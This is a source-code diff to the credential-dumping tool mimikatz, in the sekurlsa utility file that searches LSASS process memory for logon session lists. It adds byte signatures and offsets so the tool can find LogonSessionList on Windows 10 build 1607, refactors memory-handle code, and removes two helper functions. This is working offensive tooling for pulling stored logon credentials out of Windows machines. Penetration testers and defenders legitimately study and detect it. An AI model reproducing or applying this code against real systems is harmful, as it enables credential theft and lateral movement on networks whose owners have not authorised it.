@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_utils.h"
 
@@ -9,6 +9,7 @@
 BYTE PTRN_WIN5_LogonSessionList[]		= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
 BYTE PTRN_WIN6_LogonSessionList[]		= {0x4c, 0x03, 0xd8, 0x49, 0x8b, 0x03, 0x48, 0x89};
 BYTE PTRN_WIN81_LogonSessionList[]		= {0x48, 0x03, 0xc1, 0x48, 0x8b, 0x08, 0x48, 0x89};
+BYTE PTRN_WIN10_1607_LogonSessionList[]	= {0x48, 0x03, 0xC1, 0x48, 0x8B, 0x08, 0x48, 0x39, 0x41, 0x08, 0x0F, 0x85}; // to test [0x39 ...]
 KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4,   0}},
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogonSessionList),	PTRN_WIN5_LogonSessionList},	{0, NULL}, {-4, -45}},
@@ -16,12 +17,14 @@ KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_LogonSessionList),	PTRN_WIN6_LogonSessionList},	{0, NULL}, {-4, -59}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN6_LogonSessionList),	PTRN_WIN6_LogonSessionList},	{0, NULL}, {-4, -0}},
 	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WIN81_LogonSessionList),	PTRN_WIN81_LogonSessionList},	{0, NULL}, {-4, -53}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WIN10_1607_LogonSessionList),	PTRN_WIN10_1607_LogonSessionList},	{0, NULL}, {-4, -87}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WN51_LogonSessionList[]		= {0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84};
 BYTE PTRN_WNO8_LogonSessionList[]		= {0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd};
 BYTE PTRN_WIN8_LogonSessionList[]		= {0x89, 0x79, 0x04, 0x89, 0x38, 0x8d, 0x04, 0xb5};
 BYTE PTRN_WIN81_LogonSessionList[]		= {0x89, 0x79, 0x04, 0x89, 0x38, 0xff, 0x04, 0xb5};
+BYTE PTRN_WIN10_1607_LogonSessionList[]	= {0x8B, 0x08, 0x39, 0x41, 0x04, 0x74}; // to do "best"
 KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WN51_LogonSessionList),	PTRN_WN51_LogonSessionList},	{0, NULL}, { 24,   0}},
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WNO8_LogonSessionList),	PTRN_WNO8_LogonSessionList},	{0, NULL}, {-11, -43}},
@@ -29,6 +32,7 @@ KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LogonSessionList),	PTRN_WIN8_LogonSessionList},	{0, NULL}, {-20, -51}},
 	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WIN81_LogonSessionList),	PTRN_WIN81_LogonSessionList},	{0, NULL}, {-20, -49}},
 	{KULL_M_WIN_MIN_BUILD_10,	{sizeof(PTRN_WIN81_LogonSessionList),	PTRN_WIN81_LogonSessionList},	{0, NULL}, {-16, -45}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WIN10_1607_LogonSessionList),	PTRN_WIN10_1607_LogonSessionList},	{0, NULL}, {-4, -34}},
 };
 #endif
 
@@ -46,8 +50,7 @@ BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKUR
 
 BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1)
 {
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL};
 	PKULL_M_PATCH_GENERIC currentReference;
 	#ifdef _M_X64
@@ -104,8 +107,7 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 PVOID kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(PKULL_M_MEMORY_ADDRESS pSecurityStruct, ULONG LUIDoffset, PLUID luidToFind)
 {
 	PVOID resultat = NULL, pStruct;
-	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS data = {&pStruct, &hBuffer}, aBuffer = {NULL, &hBuffer};
+	KULL_M_MEMORY_ADDRESS data = {&pStruct, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 
 	if(aBuffer.address = LocalAlloc(LPTR, LUIDoffset + sizeof(LUID)))
 	{
@@ -118,7 +120,7 @@ PVOID kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(PKULL_M_MEMORY_ADDRESS pSecuri
 			{
 				if(kull_m_memory_copy(&aBuffer, &data, LUIDoffset + sizeof(LUID)))
 				{
-					if(RtlEqualLuid(luidToFind, (PLUID) ((PBYTE)(aBuffer.address) + LUIDoffset)))
+					if(SecEqualLuid(luidToFind, (PLUID) ((PBYTE)(aBuffer.address) + LUIDoffset)))
 					{
 						resultat = data.address;
 						break;
@@ -137,8 +139,7 @@ PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuid(PKULL_M_MEMORY_ADDRESS pTable, ULONG 
 {
 	PVOID resultat = NULL;
 	RTL_AVL_TABLE maTable;
-	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS data = {&maTable, &hBuffer};
+	KULL_M_MEMORY_ADDRESS data = {&maTable, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 
 	if(kull_m_memory_copy(&data, pTable, sizeof(RTL_AVL_TABLE)))
 	{
@@ -152,8 +153,7 @@ PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(PKULL_M_MEMORY_ADDRESS pTable, ULO
 {
 	PVOID resultat = NULL;
 	RTL_AVL_TABLE maTable;
-	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS data = {&maTable, &hBuffer};
+	KULL_M_MEMORY_ADDRESS data = {&maTable, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 
 	if(kull_m_memory_copy(&data, pTable, sizeof(RTL_AVL_TABLE)))
 	{
@@ -163,7 +163,7 @@ PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(PKULL_M_MEMORY_ADDRESS pTable, ULO
 			{
 				if(kull_m_memory_copy(&data, pTable, LUIDoffset + sizeof(LUID)))
 				{
-					if(RtlEqualLuid(luidToFind, (PLUID) ((PBYTE) (data.address) + LUIDoffset)))
+					if(SecEqualLuid(luidToFind, (PLUID) ((PBYTE) (data.address) + LUIDoffset)))
 						resultat = maTable.OrderedPointer;
 				}
 				LocalFree(data.address);
@@ -175,34 +175,4 @@ PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(PKULL_M_MEMORY_ADDRESS pTable, ULO
 			resultat = kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(pTable, LUIDoffset, luidToFind);
 	}
 	return resultat;
-}
-
-void kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(PVOID BaseAddress, PLSA_UNICODE_STRING String, BOOL relative)
-{
-	if(String->Buffer)
-		String->Buffer = (PWSTR) ((ULONG_PTR)(String->Buffer) + ((relative ? -1 : 1) * (ULONG_PTR)(BaseAddress)));
-}
-
-BOOL kuhl_m_sekurlsa_utils_getSid(IN PSID * pSid, IN PKULL_M_MEMORY_HANDLE source)
-{
-	BOOL status = FALSE;
-	BYTE nbAuth;
-	DWORD sizeSid;
-	KULL_M_MEMORY_HANDLE hOwn = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aDestin = {&nbAuth, &hOwn};
-	KULL_M_MEMORY_ADDRESS aSource = {(PBYTE) *pSid + 1, source};
-
-	*pSid = NULL;
-	if(kull_m_memory_copy(&aDestin, &aSource, sizeof(BYTE)))
-	{
-		aSource.address = (PBYTE) aSource.address - 1;
-		sizeSid =  4 * nbAuth + 6 + 1 + 1;
-
-		if(aDestin.address = LocalAlloc(LPTR, sizeSid))
-		{
-			*pSid = (PSID) aDestin.address;
-			status = kull_m_memory_copy(&aDestin, &aSource, sizeSid);
-		}
-	}
-	return status;
 }
